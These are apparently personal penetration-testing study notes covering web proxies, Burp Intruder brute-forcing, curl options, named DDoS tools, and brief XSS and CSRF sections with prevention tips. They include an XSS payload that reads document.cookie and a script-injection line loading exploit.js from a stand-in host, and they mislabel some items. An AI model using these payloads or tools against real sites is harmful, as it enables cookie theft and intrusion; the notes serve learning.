# Resources
https://beafn28.gitbook.io/
https://beafn28.gitbook.io/beafn28/apuntes-hacking/using-web-proxies

# Labs

# Tools

## Burp Suite (Community and Pro/Enterprise version)
'''
java -jar </path/to/burpsuite.jar>
'''

## OWASP ZAP
```
zaproxy
```
## FoxyProxy (Firefox extension for Burp and ZAP)

## Zap 
### Zap fuzzer
https://forum.hackthebox.com/t/help-with-question-proxies-zap-fuzzer/257933/23

Notice: setup CA cert for 3 tools

## Proxychains
routes all traffic coming from any command-line tool to any proxy we specify

```
$ vi /etc/proxychains.conf
#socks4         127.0.0.1 9050
http 127.0.0.1 8080
```

run any cmd with prefix 'proxychain -q' before (-q hide unuseful output). Ex: use curl
```
$ proxychains -q curl http://SERVER_IP:PORT
```
then the Burp Suit app will catch the request

## Metaspoil
investigate and debug proxy web traffic. Add `set PROXIES HTTP:127.0.0.1:8080` in msfconfig before `run`
```
$ msfconsole
... > set PROXIES HTTP:127.0.0.1:8080
...
... > run
```

## Burp Intruder
fuzzer, enumeration and automatically brute-force in web. Aternative for ffuf, dirbuster, gobuster, wfuzz CLI tools

Notice: Pro version is umlimited speed and unlimited features, whereas Community version limit speed 1 request/second and limit features
- Block request: right click in request and choose Send to Intruder (CTRL + I)
- Position: choose a place need to use fuzz and click § button
- Payload (dictionary config):
    + Payload Position: Sniper (1 target), Cluster boom (many target)
    + Payload Type: Simple List (download dictionary), Runtime file (read for each line to reduce RAM)
    + Payload Processing: Use Regex to apply rule for dictionary words
    + Payload configuration: choose a dictionary file (ex: common.txt)
    + Payload Encoding: on/off URL-encode for special words
- Settings: advance setting

Finally, click Start Attack

## curl

-O : download with filename same as server

-o [filename]: download file with specific name

-s : silent mode, turn off all detail info while downloading

-h or --help 

-k : connect without SSL cert (http)

-v : show everything about stream info as debugging mode

-u : login with basic auth (ex: curl -u admin:admin [url])

-H : header, can use it as login feature with HTTP basic Auth by adding Authorization header (ex: `Authorization: Basic code`)

-i : show response headers and body

-I : only show response header

-X : method (POST, GET...)

-d : payload

-c : save and store cookies as file (eg. cookies.txt)

-b : set cookie (use a text or a filename, such as cookies.txt)

no any param: use https, printout all html content page

## DDOS
### HOIC

### LOIC

### jMeter

# Contents

## HTML Injection

## XSS
Cause:

developer did use directly element.innerHTML without parsing to string :
```
let userInput = document.getElementById("userInput").value;
document.getElementById("result").innerHTML = "Result: " + userInput;
```
so when we break it down by geting cookie from user local:
```
"><img src=/ onerror=alert(document.cookie)>
``` 
the cookie will be shown

the "> prefix is used to break the structure of value, if doesn't use it, the result will be:
```
<input type="text" name="username" value="<img src=/ onerror=alert(document.cookie)>">
```
the "> will break down the value

## CSRF
```
"><script src=//www.example.com/exploit.js></script>
```
How to prevent? 
1. Eliminate all spcecial characters like <, >, ".
2. Check valid of email, name, phone number,...
3. Use Anti-CSRF mechanism in browsers, such ask Anti-CSRF token, which only use 1 unique token for each session/request
4. config Cookies property as a `SameSite=Strict` level or `Lax` to prevent browser attach authen cookies in cross-origin
5. Ask client re-type password before handling sensitive action, such as changing password, email...

